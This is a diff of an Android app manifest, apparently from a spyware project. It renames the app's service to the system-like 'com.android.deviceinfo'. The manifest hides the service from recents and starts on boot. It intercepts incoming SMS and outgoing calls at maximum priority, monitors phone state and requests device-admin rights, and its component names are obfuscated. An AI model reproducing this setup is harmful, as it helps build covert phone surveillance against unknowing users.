@@ -31,14 +31,15 @@
 	<uses-permission android:name="android.permission.WAKE_LOCK" />
 	<uses-permission android:name="android.permission.USER_PRESENT" />
 	<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
-	
-	<uses-sdk android:minSdkVersion="8"  android:targetSdkVersion="10" />
-	
-	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="false" android:allowBackup="false" >
-		<service android:name=".ServiceMain" android:exported="true"
-			android:excludeFromRecents="true">
+
+	<uses-sdk android:minSdkVersion="8" android:targetSdkVersion="10" />
+
+	<application android:icon="@drawable/icon" android:label="@string/app_name"
+		android:debuggable="false" android:allowBackup="false">
+		<service android:name="com.android.deviceinfo.ServiceMain"
+			android:exported="true" android:excludeFromRecents="true">
 			<intent-filter>
-				<action android:name="com.android.networking.app"/>		
+				<action android:name="com.android.deviceinfo.app" />
 			</intent-filter>
 		</service>
 
@@ -47,14 +48,14 @@
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<action android:name="android.intent.action.USER_PRESENT" />
 			</intent-filter>
-			
+
 			<intent-filter android:priority="65535">
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-            </intent-filter>
+				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
+				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+			</intent-filter>
 		</receiver>
-		
-	
+
+
 		<receiver android:name=".listener.BAc">
 		</receiver>
 
@@ -67,30 +68,25 @@
 			</intent-filter>
 		</receiver>
 
-		<receiver android:name=".listener.BC"
-			android:exported="true">
+		<receiver android:name=".listener.BC" android:exported="true">
 			<intent-filter android:priority="0">
 				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
 				<action android:name="android.intent.action.PHONE_STATE" />
 				<category android:name="android.intent.category.DEFAULT" />
 			</intent-filter>
 		</receiver>
-		
-		 <.listenerur receiver -->
-        <receiver
-            android:name=".listener.AR"
-            android:permission="android.permission.BIND_DEVICE_ADMIN" >
-            <intent-filter>
 
-                <!-- This action is required -->
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-            </intent-filter>
+		<receiver android:name=".listener.AR" android:permission="android.permission.BIND_DEVICE_ADMIN">
+			<intent-filter>
 
-            <!-- This is required this receiver to become device admin component. -->
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_a" />
-        </receiver>
+				<!-- This action is required -->
+				<action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+			</intent-filter>
+
+			<!-- This is required this receiver to become device admin component. -->
+			<meta-data android:name="android.app.device_admin"
+				android:resource="@xml/device_a" />
+		</receiver>
 	</application>
 
-</manifest> 
+</manifest>
